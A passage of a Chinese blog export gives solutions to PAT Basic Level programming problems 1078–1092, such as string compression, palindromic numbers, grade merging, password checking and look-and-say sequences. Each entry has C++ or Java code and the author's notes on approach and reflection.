&amp;&amp; !isdigit(str[i])) cout &lt;&lt; str[i++]; }}int main () { char c; scanf(&quot;%c%*c&quot;, &amp;c); if (c == 'C') C(); else D(); return 0;} 思路与注意 coding（压缩）一个函数，decoding（解压）一个函数分别处理 两个函数统一使用getline，main函数里面要吃掉第一行的换行符 对于coding过程 定义一个结构体数组，储存字符与个数。数组长度为输入string的长度（如果输入的string不能压缩，正好够用） 遍历一遍string，如果字符和前一个字符一样，那么当前结构体（变量）的字符个数++，一旦改变，存到下一个结构体中。 输出结构体，先输出个数（大于1才输出），再输出这个字符 对于decoding过程 先判断第一个字符，如果是字母直接输出这个字母，然后字符串的“指针”向后移。 进入循环，循环的操作为，得到数字，输出数字后的字母，然后输出后面的单个字母，直到遇到下一个数字，进入下一次循环，或者遇到字符串结束，那就结束。 注意不要用isalpha()函数（考虑空格的存在） 反思与评价 嗯","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1078-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8E%8B%E7%BC%A9%E4%B8%8E%E8%A7%A3%E5%8E%8B(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1079","text":"题目 给定一个 k+1 位的正整数 N，写成 ak⋯a1a0 的形式，其中对所有 i 有 0≤ai&lt;10 且 ak&gt;0。N 被称为一个回文数，当且仅当对所有 i 有 ai=ak−i。零也被定义为一个回文数。 非回文数也可以通过一系列操作变出回文数。首先将该数字逆转，再将逆转数与该数相加，如果和还不是一个回文数，就重复这个逆转再相加的操作，直到一个回文数出现。如果一个非回文数可以变出回文数，就称这个数为延迟的回文数。（定义翻译自 https://en.wikipedia.org/wiki/Palindromic_number ） 给定任意一个正整数，本题要求你找到其变出的那个回文数。 输入格式： 输入在一行中给出一个不超过1000位的正整数。 输出格式： 对给定的整数，一行一行输出其变出回文数的过程。每行格式如下 1A + B = C 其中 A 是原始的数字，B 是 A 的逆转数，C 是它们的和。A 从输入的整数开始。重复操作直到 C 在 10 步以内变成回文数，这时在一行中输出 C is a palindromic number.；或者如果 10 步都没能得到回文数，最后就在一行中输出 Not found in 10 iterations.。 输入样例 1：197152 输出样例 1：12397152 + 25179 = 122331122331 + 133221 = 255552255552 is a palindromic number. 输入样例 2：1196 输出样例 2：1234567891011196 + 691 = 887887 + 788 = 16751675 + 5761 = 74367436 + 6347 = 1378313783 + 38731 = 5251452514 + 41525 = 9403994039 + 93049 = 187088187088 + 880781 = 10678691067869 + 9687601 = 1075547010755470 + 07455701 = 18211171Not found in 10 iterations. 通过代码12345678910111213141516171819202122232425262728293031323334import java.util.*;import java.math.*;class Main { static BigInteger getReverseNum(BigInteger a) { StringBuffer bf = new StringBuffer(a.toString()); bf.reverse(); BigInteger b = new BigInteger(bf.toString()); return b; } static boolean isPalindromicNumber(BigInteger a) { String n = a.toString(); int len = n.length(); for (int i = 0; i &lt; len / 2; i++) if (n.charAt(i) != n.charAt(len - i - 1)) return false; return true; } public static void main (String[] args) { Scanner sc = new Scanner(System.in); boolean ok = false; BigInteger a = sc.nextBigInteger(); for (int i = 0; i &lt; 10; i++) { if (isPalindromicNumber(a)) { System.out.println(a + &quot; is a palindromic number.&quot;); ok = true; break; } BigInteger b = getReverseNum(a); BigInteger c = a.add(b); System.out.println(a + &quot; + &quot; + b + &quot; = &quot; + c); a = c; } if (!ok) System.out.println(&quot;Not found in 10 iterations.&quot;); }} 思路与注意 题目中说是1000位的整数，所以一般的long解决不了，要用到java.math.*;中的BigInteger类 根据题目要求计算就好 要在10步内出结果，适合用for循环 循环的时候要先判断是否为Palindromic Number，有可能输入的第一个数就是Palindromic Number。 反思与评价 选择语言很重要，Java提供的BigInteger完美解决 c++写的话可以在网上找一份大整型的模板来用","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1079-%E5%BB%B6%E8%BF%9F%E7%9A%84%E5%9B%9E%E6%96%87%E6%95%B0(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1080","text":"题目 对于在中国大学MOOC（http://www.icourse163.org/ ）学习“数据结构”课程的学生，想要获得一张合格证书，必须首先获得不少于200分的在线编程作业分，然后总评获得不少于60分（满分100）。总评成绩的计算公式为 G=(Gmid−term×40%+Gfinal×60%)，如果 Gmid−term&gt;Gfinal；否则总评 G 就是 Gfinal。这里 Gmid−term 和 Gfinal 分别为学生的期中和期末成绩。 现在的问题是，每次考试都产生一张独立的成绩单。本题就请你编写程序，把不同的成绩单合为一张。 输入格式： 输入在第一行给出3个整数，分别是 P（做了在线编程作业的学生数）、M（参加了期中考试的学生数）、N（参加了期末考试的学生数）。每个数都不超过10000。 接下来有三块输入。第一块包含 P 个在线编程成绩 Gp；第二块包含 M 个期中考试成绩 Gmid−term；第三块包含 N 个期末考试成绩 Gfinal。每个成绩占一行，格式为：学生学号 分数。其中学生学号为不超过20个字符的英文字母和数字；分数是非负整数（编程总分最高为900分，期中和期末的最高分为100分）。 输出格式： 打印出获得合格证书的学生名单。每个学生占一行，格式为： 学生学号 Gp Gmid−term Gfinal G 如果有的成绩不存在（例如某人没参加期中考试），则在相应的位置输出“−1”。输出顺序为按照总评分数（四舍五入精确到整数）递减。若有并列，则按学号递增。题目保证学号没有重复，且至少存在1个合格的学生。 输入样例：12345678910111213141516171819206 6 701234 880a1903 199ydjh2 200wehu8 300dx86w 220missing 400ydhfu77 99wehu8 55ydjh2 98dx86w 88a1903 8601234 39ydhfu77 88a1903 6601234 58wehu8 84ydjh2 82missing 99dx86w 81 输出样例：1234missing 400 -1 99 99ydjh2 200 98 82 88dx86w 220 88 81 84wehu8 300 55 84 84 通过代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;iostream&gt;#include &lt;map&gt;#include &lt;algorithm&gt;#include &lt;vector&gt;#include &lt;cmath&gt;using namespace std;class data {public: double Gp, GmidTerm, Gfinal, G; string name; data() { G = -1; Gfinal = -1; Gp = -1; GmidTerm = -1; } void setGp(double a) {Gp = a;} void setGmidTerm(double a) {GmidTerm = a;} void setGfinal(double a) {Gfinal = a;} void setName(string n) { name = n; } void final() { if (GmidTerm &gt; Gfinal) G = GmidTerm * 0.4 + Gfinal * 0.6; else G = Gfinal; G = round(G); GmidTerm = round(GmidTerm); Gfinal = round(Gfinal); Gp = round(Gp); }};typedef pair&lt;string, data&gt; PAIR;bool cmp1(PAIR&amp; a, PAIR&amp; b) { if (a.second.G != b.second.G) return a.second.G &gt; b.second.G; else return a.second.name &lt; b.second.name;}int main () { map&lt;string, data&gt; m; int a, b, c; double score; string name; cin &gt;&gt; a &gt;&gt; b &gt;&gt; c; for (int i = 0; i &lt; a; i++) { cin &gt;&gt; name &gt;&gt; score; m[name].setGp(score); m[name].setName(name); } for (int i = 0; i &lt; b; i++) { cin &gt;&gt; name &gt;&gt; score; m[name].setGmidTerm(score); } for (int i = 0; i &lt; c; i++) { cin &gt;&gt; name &gt;&gt; score; m[name].setGfinal(score); m[name].final(); } vector&lt;PAIR&gt; v; int i = 0; for (map&lt;string, data&gt;::iterator ite = m.begin(); ite != m.end(); ite++, i++) v.push_back(*ite); sort(v.begin(), v.end(), cmp1); for (int i = 0; i &lt; v.size(); i++) if (v[i].second.Gp &gt;= 200 &amp;&amp; v[i].second.G &gt;= 60) printf (&quot;%s %.0lf %.0lf %.0lf %.0lf\\n&quot;, v[i].second.name.data(), v[i].second.Gp, v[i].second.GmidTerm, v[i].second.Gfinal, v[i].second.G); return 0;} 思路与注意 利用类来管理数据，比较方便 第一个难点在于ID不是纯数字，不能把ID当做数组引索，想到使用map 第二个难点在于对map排序，map是默认以key排序的，这道题要对map的value进行排序 注意，数据输入并计算好以后，先四舍五入（round() 函数），再排序输出。 反思与评价 学到了很多关于map的知识 刚开始不用vector用普通数组的时候，最后一个测试点出现段错误，不知道是什么问题。 收获 map的排序 map默认按照key进行升序排序，和输入的顺序无关。如果是int/double等数值型为key，那么就按照大小排列；如果是string类型，那么就按照字符串的字典序进行排列 我们在定义map类模板的时候不是只有两个参数吗~（map&lt;string, int&gt;）~~其实map一共有4个参数，后面省略的，或者说是默认的第三个参数就是关于排序规则的 具体而言，它有四个参数，其中我们比较熟悉的有两个: Key 和 Value。第三个是class Compare = less&lt;Key&gt;(排序方式)，第四个是 Allocator，用来定义存储分配模型的。 对key进行自定义排序 map不能调用sort排序，是因为：map是个关联容器，不是序列容器。像是一些序列容器list, vector都是可以排序的。 对map的value排序的想法 首先，map中的&lt;key, value&gt;是pair形式的，那么我们就可以把一个pair作为vector中的元素； 然后，调用vetor容器中的sort函数，sort函数也是可以用户指定比较类型的。 对key进行自定义排序 1234567891011121314151617181920212223242526272829#include&lt;iostream&gt;#include&lt;string&gt;#include&lt;algorithm&gt;#include&lt;map&gt;using namespace std;struct cmp //自定义比较规则{ bool operator() (const string&amp; str1, const string&amp; str2) { return str1.length() &lt; str2.length(); }};int main(){ map&lt;string, int, cmp &gt; scoreMap; //这边调用cmp map&lt;string, int, cmp &gt;::iterator iter; scoreMap[&quot;LiMin&quot;] = 90; scoreMap[&quot;ZZihsf&quot;] = 95; scoreMap[&quot;Kim&quot;] = 100; scoreMap.insert(map&lt;string, int&gt;::value_type(&quot;Jack&quot;, 88)); for (iter = scoreMap.begin(); iter != scoreMap.end(); iter++) cout &lt;&lt; iter-&gt;first &lt;&lt; ' ' &lt;&lt; iter-&gt;second &lt;&lt; endl; return 0;} 根据value排序 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include&lt;iostream&gt;#include&lt;string&gt;#include&lt;algorithm&gt;#include&lt;map&gt;#include&lt;vector&gt;using namespace std; typedef pair&lt;string, int&gt; PAIR; struct cmp //自定义比较规则{ bool operator() (const PAIR&amp; P1, const PAIR&amp; P2) //注意是PAIR类型，需要.firt和.second。这个和map类似 { return P1.second &lt; P2.second; }}; int main(){ map&lt;string, int&gt; scoreMap; //这边调用cmp map&lt;string, int&gt;::iterator iter; scoreMap[&quot;LiMin&quot;] = 90; scoreMap[&quot;ZZihsf&quot;] = 95; scoreMap[&quot;Kim&quot;] = 100; scoreMap.insert(map&lt;string, int&gt;::value_type(&quot;Jack&quot;, 88)); vector&lt;PAIR&gt;scoreVector; for(iter=scoreMap.begin(); iter!=scoreMap.end();iter++) //这边本来是使用vector直接初始化的，当时由于vc 6.0 编译器问题，只能这样写，而且还有非法内存。。 scoreVector.push_back(*iter); //转化为PAIR的vector sort(scoreVector.begin(), scoreVector.end(), cmp()); //需要指定cmp for(int i=0; i&lt;=scoreVector.size(); i++) //也要按照vector的形式输出 cout&lt;&lt; scoreVector[i].first&lt;&lt;' '&lt;&lt;scoreVector[i].second &lt;&lt;endl; /* for(iter=scoreMap.begin(); iter!=scoreMap.end(); iter++) cout&lt;&lt;iter-&gt;first&lt;&lt;' '&lt;&lt;iter-&gt;second&lt;&lt;endl; */ return 0; } 四舍五入函数（其实早就学过，偷懒没有记） round(); 头文件 cmath 参考文献CSDN——STL容器（三）——对map排序","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1080-MOOC%E6%9C%9F%E7%BB%88%E6%88%90%E7%BB%A9(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1081","text":"题目 本题要求你帮助某网站的用户注册模块写一个密码合法性检查的小功能。该网站要求用户设置的密码必须由不少于6个字符组成，并且只能有英文字母、数字和小数点 .，还必须既有字母也有数字。 输入格式： 输入第一行给出一个正整数 N（≤ 100），随后 N 行，每行给出一个用户设置的密码，为不超过 80 个字符的非空字符串，以回车结束。 输出格式： 对每个用户的密码，在一行中输出系统反馈信息，分以下5种： 如果密码合法，输出Your password is wan mei.； 如果密码太短，不论合法与否，都输出Your password is tai duan le.； 如果密码长度合法，但存在不合法字符，则输出Your password is tai luan le.； 如果密码长度合法，但只有字母没有数字，则输出Your password needs shu zi.； 如果密码长度合法，但只有数字没有字母，则输出Your password needs zi mu.。 输入样例：1234565123szheshi.wodepw1234.5678WanMei23333pass*word.6 输出样例：12345Your password is tai duan le.Your password needs shu zi.Your password needs zi mu.Your password is wan mei.Your password is tai luan le. 通过代码12345678910111213141516171819202122#include &lt;iostream&gt;using namespace std;int main () { string pwd; getline(cin, pwd); while (getline(cin, pwd)) { if (pwd.length() &gt;= 6) { bool alpha = false, num = false, dot = false, other = false; for (int i = 0; i &lt; pwd.length(); i++) { if (isalpha(pwd[i])) alpha = true; else if (isdigit(pwd[i])) num = true; else if (pwd[i] == '.') dot = true; else other = true; } if (!other &amp;&amp; alpha &amp;&amp; num) cout &lt;&lt; &quot;Your password is wan mei.&quot; &lt;&lt; endl; else if (other) cout &lt;&lt; &quot;Your password is tai luan le.&quot; &lt;&lt; endl; else if (!num &amp;&amp; alpha) cout &lt;&lt; &quot;Your password needs shu zi.&quot; &lt;&lt; endl; else if (num &amp;&amp; !alpha) cout &lt;&lt; &quot;Your password needs zi mu.&quot; &lt;&lt; endl; } else { cout &lt;&lt; &quot;Your password is tai duan le.&quot; &lt;&lt; endl; } } return 0;}","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1081-%E6%A3%80%E6%9F%A5%E5%AF%86%E7%A0%81(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1082","text":"题目 本题目给出的射击比赛的规则非常简单，谁打的弹洞距离靶心最近，谁就是冠军；谁差得最远，谁就是菜鸟。本题给出一系列弹洞的平面坐标(x,y)，请你编写程序找出冠军和菜鸟。我们假设靶心在原点(0,0)。 输入格式： 输入在第一行中给出一个正整数 N（≤ 10 000）。随后 N 行，每行按下列格式给出： 1ID x y 其中 ID 是运动员的编号（由 4 位数字组成）；x 和 y 是其打出的弹洞的平面坐标(x,y)，均为整数，且 0 ≤ |x|, |y| ≤ 100。题目保证每个运动员的编号不重复，且每人只打 1 枪。 输出格式： 输出冠军和菜鸟的编号，中间空 1 格。题目保证他们是唯一的。 输入样例：123430001 5 71020 -1 30233 0 -1 输出样例：10233 0001 通过代码1234567891011121314151617181920#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cmath&gt;using namespace std;struct shoot { int id; double x; double y; double len; };bool cmp(shoot&amp; a, shoot&amp; b) { return a.len &lt; b.len;}int main () { int n; cin &gt;&gt; n; shoot v[n]; for (int i = 0; i &lt; n; i++) { cin &gt;&gt; v[i].id &gt;&gt; v[i].x &gt;&gt; v[i].y; v[i].len = sqrt(v[i].x * v[i].x + v[i].y * v[i].y); } sort(v, v + n, cmp); printf (&quot;%04d %04d\\n&quot;, v[0].id, v[n - 1].id); return 0;} 思路与注意 没有难度 反思与评价 没有难度 附（刚学C一个月时写的代码）（当时结构体都不会）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;stdio.h&gt;#include &lt;math.h&gt;#include &lt;algorithm&gt; bool find_max (double, double *, int);bool find_min (double, double *, int);int main () { int n; scanf (&quot;%d&quot;, &amp;n); int num[n] = {0}; double x = 0; double y = 0; double distance[n] = {0}; for (int i = 0; i &lt; n; i++) { scanf (&quot;%d%lf%lf&quot;, &amp;num[i], &amp;x, &amp;y); distance[i] = sqrt(x*x+ y*y); } //std::sort(distance, distance+n); int max_n = 0, min_n = 0; for (int i = 0; i &lt; n; i++) { if (find_max(distance[i], distance, n)) { max_n = i; } if (find_min(distance[i], distance, n)) { min_n = i; } } printf (&quot;%04d %04d&quot;, num[min_n], num[max_n]); return 0;}bool find_max (double a, double * arr, int len) { for (int i = 0; i &lt; len; i++) { if (a &gt;= arr[i]) { if (i == len - 1) { return true; } } else { break; } } return false;}bool find_min (double a, double * arr, int len) { for (int i = 0; i &lt; len; i++) { if (a &lt;= arr[i]) { if (i == len - 1) { return true; } } else { break; } } return false;}","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1082-%E5%B0%84%E5%87%BB%E6%AF%94%E8%B5%9B(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1084","text":"题目 外观数列是指具有以下特点的整数序列： 1d, d1, d111, d113, d11231, d112213111, ... 它从不等于 1 的数字 d 开始，序列的第 n+1 项是对第 n 项的描述。比如第 2 项表示第 1 项有 1 个 d，所以就是 d1；第 2 项是 1 个 d（对应 d1）和 1 个 1（对应 11），所以第 3 项就是 d111。又比如第 4 项是 d113，其描述就是 1 个 d，2 个 1，1 个 3，所以下一项就是 d11231。当然这个定义对 d = 1 也成立。本题要求你推算任意给定数字 d 的外观数列的第 N 项。 输入格式： 输入第一行给出 [0,9] 范围内的一个整数 d、以及一个正整数 N（≤ 40），用空格分隔。 输出格式： 在一行中给出数字 d 的外观数列的第 N 项。 输入样例：11 8 输出样例：11123123111 通过代码12345678910111213141516171819202122232425#include &lt;iostream&gt;using namespace std;void add(string&amp; str, char c, int&amp; n) { char toNum[1024] = {0}; str.append(&amp;c, 1);//这样可以“骗”append函数c是只有一个字符的字符串 sprintf(toNum, &quot;%d&quot;, n); str.append(toNum); n = 0;}int main () { string d; int n; cin &gt;&gt; d &gt;&gt; n; string&amp; temp = d;//建立一个对字符串的引用，循环的时候可以避免拷贝 for (int i = 0, count = 1; i &lt; n - 1; i++, count = 1) { string next = &quot;&quot;; for (int j = 1; j &lt; temp.length(); j++, count++) if (temp[j - 1] != temp[j]) add(next, temp[j - 1], count); add(next, temp[temp.length() - 1], count); temp = next; } cout &lt;&lt; temp &lt;&lt; endl; return 0;} 思路和注意 读懂题很关键第n+1项是对第n项的描述 就是遍历前一项，数出连续的某个字符c有几个，然后自己就变成了c + c的个数 这道题的核心算法和PAT乙级题–1078 字符串压缩与解压的压缩部分的算法类似","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1084-%E5%A4%96%E8%A7%82%E6%95%B0%E5%88%97(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1085","text":"题目 每次 PAT 考试结束后，考试中心都会发布一个考生单位排行榜。本题就请你实现这个功能。 输入格式： 输入第一行给出一个正整数 N（≤10^5），即考生人数。随后 N 行，每行按下列格式给出一个考生的信息： 1准考证号 得分 学校 其中准考证号是由 6 个字符组成的字符串，其首字母表示考试的级别：B代表乙级，A代表甲级，T代表顶级；得分是 [0, 100] 区间内的整数；学校是由不超过 6 个英文字母组成的单位码（大小写无关）。注意：题目保证每个考生的准考证号是不同的。 输出格式： 首先在一行中输出单位个数。随后按以下格式非降序输出单位的排行榜： 1排名 学校 加权总分 考生人数 其中排名是该单位的排名（从 1 开始）；学校是全部按小写字母输出的单位码；加权总分定义为乙级总分/1.5 + 甲级总分 + 顶级总分*1.5的整数部分；考生人数是该属于单位的考生的总人数。学校首先按加权总分排行。如有并列，则应对应相同的排名，并按考生人数升序输出。如果仍然并列，则按单位码的字典序输出。 输入样例：123456789101110A57908 85 AuB57908 54 LanXA37487 60 auT28374 67 CMUT32486 24 hypuA66734 92 cmuB76378 71 AUA47780 45 lanxA72809 100 pkuA03274 45 hypu 输出样例：12345651 cmu 192 21 au 192 33 pku 100 14 hypu 81 24 lanx 81 2 通过代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;algorithm&gt;#include &lt;cmath&gt;#include &lt;iostream&gt;#include &lt;map&gt;#include &lt;vector&gt;using namespace std;struct data { int count; double score;};typedef pair&lt;string, data&gt; PAIR;bool cmp(PAIR &amp;a, PAIR &amp;b) { //比较，三个排序关键词 if (a.second.score != b.second.score) return a.second.score &gt; b.second.score; else if (a.second.count != b.second.count) return a.second.count &lt; b.second.count; else return a.first &lt; b.first;}void input(map&lt;string, data&gt; &amp;m) { //输入并计算分数 int n; cin &gt;&gt; n; for (int i = 0; i &lt; n; i++) { string id, school; int score; cin &gt;&gt; id &gt;&gt; score &gt;&gt; school; transform(school.begin(), school.end(), school.begin(), ::tolower); //变成小写 if (id[0] == 'B') m[school].score += score / 1.5; else if (id[0] == 'A') m[school].score += score; else if (id[0] == 'T') m[school].score += score * 1.5; m[school].count++; }}void mapToVector(map&lt;string, data&gt; &amp;m, vector&lt;PAIR&gt; &amp;v) { //放进vector来利用sort排序 for (map&lt;string, data&gt;::iterator ite = m.begin(); ite != m.end(); ite++) { ite-&gt;second.score = floor(ite-&gt;second.score); //根据题意要floor向左取整 v.push_back(*ite); }}void print(vector&lt;PAIR&gt; &amp;v) { //按要求排名并输出数据 cout &lt;&lt; v.size() &lt;&lt; endl; int now = v[0].second.score, r = 1; for (int i = 0; i &lt; v.size(); i++) { if (v[i].second.score != now) r = i + 1; cout &lt;&lt; r &lt;&lt; &quot; &quot; &lt;&lt; v[i].first &lt;&lt; &quot; &quot; &lt;&lt; v[i].second.score &lt;&lt; &quot; &quot; &lt;&lt; v[i].second.count &lt;&lt; endl; now = v[i].second.score; }}int main() { map&lt;string, data&gt; m; vector&lt;PAIR&gt; v; input(m); //输入并计算分数 mapToVector(m, v); //放进vector来利用sort排序 sort(v.begin(), v.end(), cmp); //排序 print(v); //按要求排名并输出数据 return 0;} 思路与注意 这道题不用考虑同一人参与多场考试 由于不想太多变量，所以只有一个总分变量，所以要用double，最后要floor向左取整。 map是关联容器不能sort排序，要放进vector里面再排序 详见PAT乙级题–1080 MOOC期终成绩，里面有对map排序的笔记 排序的时候注意有三个关键词，分数（降序）、人数（升序）和学校名称（ASCII升序） 利用引用传递变量，浅拷贝，避免深拷贝 关于排名，思想是：先排序，排序后，令一个值now为第一个数，循环只要是和第一个数相同的就还是这个排名，一旦不等，说明后一名出现了，这是让now为当前这个数，然后让排名 = i+1（根据需要，有时是排名++）。后来为了压行，进一步提炼，每次循环让now = v[i].second.score，即让now记录上一次循环的值，比较与上次循环的分数是否相同，相同则排名相同，不同则排名按照需要改变 反思与评价 很好的利用了STL，希望能尽快用纯C写出来 开心嘿嘿，终于进入前1000了，加油！这个寒假刷完乙级题！","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1085-PAT%E5%8D%95%E4%BD%8D%E6%8E%92%E8%A1%8C(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1086","text":"题目 做作业的时候，邻座的小盆友问你：“五乘以七等于多少？”你应该不失礼貌地围笑着告诉他：“五十三。”本题就要求你，对任何一对给定的正整数，倒着输出它们的乘积。#### 输入格式：输入在第一行给出两个不超过 1000 的正整数 A 和 B，其间以空格分隔。 输出格式： 在一行中倒着输出 A 和 B 的乘积。 输入样例：15 7 输出样例：153 通过代码（极致压行版）123456789#include &lt;stdio.h&gt;int main () { int a, b; scanf (&quot;%d%d&quot;, &amp;a, &amp;b); int c = a * b; while (c &amp;&amp; c % 10 == 0)c /= 10;//忽略前导0，ab == 0则不循环 do printf (&quot;%d&quot;, c % 10); while (c /= 10);//do-while，先输出，再除10，ab == 0则只输出一个0 return 0;} 通过代码（正常版）1234567891011121314#include &lt;stdio.h&gt;int main () { int a, b; scanf (&quot;%d%d&quot;, &amp;a, &amp;b); int c = a * b; while (c &amp;&amp; c % 10 == 0) { c /= 10; }//忽略前导0，ab == 0则不循环 do { printf (&quot;%d&quot;, c % 10); c /= 10; } while (c);//do-while，先输出，再除10，ab == 0则只输出一个0 return 0;} 思路与注意 简单 反思与评价 简单","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1086-%E5%B0%B1%E4%B8%8D%E5%91%8A%E8%AF%89%E4%BD%A0(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1088","text":"题目 子曰：“三人行，必有我师焉。择其善者而从之，其不善者而改之。” 本题给定甲、乙、丙三个人的能力值关系为：甲的能力值确定是 2 位正整数；把甲的能力值的 2 个数字调换位置就是乙的能力值；甲乙两人能力差是丙的能力值的 X 倍；乙的能力值是丙的 Y 倍。请你指出谁比你强应“从之”，谁比你弱应“改之”。 输入格式： 输入在一行中给出三个数，依次为：M（你自己的能力值）、X 和 Y。三个数字均为不超过 1000 的正整数。 输出格式： 在一行中首先输出甲的能力值，随后依次输出甲、乙、丙三人与你的关系：如果其比你强，输出 Cong；平等则输出 Ping；比你弱则输出 Gai。其间以 1 个空格分隔，行首尾不得有多余空格。 注意：如果解不唯一，则以甲的最大解为准进行判断；如果解不存在，则输出 No Solution。 输入样例 1：48 3 7 输出样例 1：48 Ping Cong Gai 输入样例 2：48 11 6 输出样例 2：No Solution 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import java.util.*;class Main { static Scanner sc; static { sc = new Scanner(System.in); } static String print(double a, double b) { if (a &lt; b) { return &quot;Cong&quot;; } else if (a == b) { return &quot;Ping&quot;; } else { return &quot;Gai&quot;; } } public static void main(String[] args) { int m = sc.nextInt(); int x = sc.nextInt(); int y = sc.nextInt(); boolean find = false; for (int a = 99; a &gt;= 10; a--) { double b = a % 10 * 10 + a / 10; double c = b / y; if (c != Math.abs((a - b) / x)) { continue; } else { find = true; System.out.print(a + &quot; &quot; + Main.print(m, a) + &quot; &quot; + Main.print(m, b) + &quot; &quot; + Main.print(m, c)); break; } } if (!find) { System.out.println(&quot;No Solution&quot;); } }}/* * a b c * c/x = a-b * c/y = b * c(1/x+1/y) = a * */ 思路与注意 abc\b三个变量代表甲乙丙，由于a已知是两位数，且需要\b解中甲最大的情况，所以就for循环从99到10 \b2. 注意b，c要的是精确值，不是\b整型取商的结果 反思与评价反思&amp;#160; &amp;#160; &amp;#160; &amp;#160;好像是一遍过的吧？ 评价&amp;#160; &amp;#160; &amp;#160; &amp;#160;无","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1088-%E4%B8%89%E4%BA%BA%E8%A1%8C(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1090","text":"题目 集装箱运输货物时，我们必须特别小心，不能把不相容的货物装在一只箱子里。比如氧化剂绝对不能跟易燃液体同箱，否则很容易造成爆炸。 本题给定一张不相容物品的清单，需要你检查每一张集装箱货品清单，判断它们是否能装在同一只箱子里。 输入格式： 输入第一行给出两个正整数：N (≤104) 是成对的不相容物品的对数；M (≤100) 是集装箱货品清单的单数。 随后数据分两大块给出。第一块有 N 行，每行给出一对不相容的物品。第二块有 M 行，每行给出一箱货物的清单，格式如下： 1K G[1] G[2] ... G[K] 其中 K (≤1000) 是物品件数，G[i] 是物品的编号。简单起见，每件物品用一个 5 位数的编号代表。两个数字之间用空格分隔。 输出格式： 对每箱货物清单，判断是否可以安全运输。如果没有不相容物品，则在一行中输出 Yes，否则输出 No。 输入样例：123456789106 320001 2000220003 2000420005 2000620003 2000120005 2000420004 200064 00001 20004 00002 200035 98823 20002 20003 20006 100103 12345 67890 23333 输出样例：123NoYesYes 通过代码12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;map&gt;using namespace std;int main() { int n, k; map&lt;int, vector&lt;int&gt;&gt; m; scanf(&quot;%d%d&quot;, &amp;n, &amp;k); for (int i = 0; i &lt; n; i++) { int x, y; scanf(&quot;%d%d&quot;, &amp;x, &amp;y); m[x].push_back(y); m[y].push_back(x); } while (k--) { int K, has[100000] = {0}; scanf(&quot;%d&quot;, &amp;K); vector&lt;int&gt; v(K); for (int i = 0; i &lt; K; i++) { scanf(&quot;%d&quot;, &amp;v[i]); has[v[i]] = 1; } bool find = false; for (int i = 0; i &lt; v.size(); i++) for (int j = 0; j &lt; m[v[i]].size(); j++) if (has[m[v[i]][j]]) find = true; if (find) printf(&quot;No\\n&quot;); else printf (&quot;Yes\\n&quot;); } return 0;} 思路与注意 搞一个数组has，用id当引索，储存是否存在这个物品 搞一个map映射，从id到一个vector，vector为与这个物品不共存的物品编号（可能存在多个不共存物体） 两层for循环，利用has数组，跟自己不共存的物品穿上有没有，如果有，就结束 反思与评价 这道题本身想用二维数组记录是否配对，这样复杂度为n * n，一直过不了 这道题挺有难度的，也是看了网上的大神才写出来的","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1090-%E5%8D%B1%E9%99%A9%E5%93%81%E8%A3%85%E7%AE%B1(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1091","text":"题目 如果某个数 K 的平方乘以 N 以后，结果的末尾几位数等于 K，那么就称这个数为“N-自守数”。例如 3×922 = 25392，而 25392 的末尾两位正好是 92，所以 92 是一个 3-自守数。 本题就请你编写程序判断一个给定的数字是否关于某个 N 是 N-自守数。 输入格式： 输入在第一行中给出正整数 M（≤20），随后一行给出 M 个待检测的、不超过 1000 的正整数。 输出格式： 对每个需要检测的数字，如果它是 N-自守数就在一行中输出最小的 N 和 NK^2 的值，以一个空格隔开；否则输出 No。注意题目保证 N&lt;10。 输入样例：3 92 5 233 输出样例：3 25392 1 25 No 通过代码12345678910111213141516171819202122232425262728293031323334import java.util.*;class Main { static Scanner sc; static { sc = new Scanner(System.in); } public static void main(String[] args) { int n = sc.nextInt(); int arr = 0; for (int i = 0; i &lt; n; i++) { arr = sc.nextInt(); Integer temp = arr; int len = temp.toString().length(); boolean find = false; for (int j = 1; j &lt; 10; j++) { temp = arr * arr * j; String y = temp.toString().substring(temp.toString().length() - len, temp.toString().length()); temp = arr; if (y.equals(temp.toString())) { System.out.println(j + &quot; &quot; + arr * arr * j); find = true; break; } } if (!find) { System.out.println(&quot;No&quot;); } } }} 错误反思与代码评价错误反思好像是一遍过的吧？ 代码评价java的类都有一个toString方法真的超级方便哦，直接平方，赋值给Integer调用toString再截取后面一段，跟原来的数比较，So easy!","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1091-N-%E8%87%AA%E5%AE%88%E6%95%B0(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1092","text":"题目 月饼是久负盛名的中国传统糕点之一，自唐朝以来，已经发展出几百品种。 若想评比出一种“最好吃”的月饼，那势必在吃货界引发一场腥风血雨…… 在这里我们用数字说话，给出全国各地各种月饼的销量，要求你从中找出销量冠军，认定为最好吃的月饼。 输入格式： 输入首先给出两个正整数 N（≤1000）和 M（≤100），分别为月饼的种类数（于是默认月饼种类从 1 到 N 编号）和参与统计的城市数量。接下来 M 行，每行给出 N 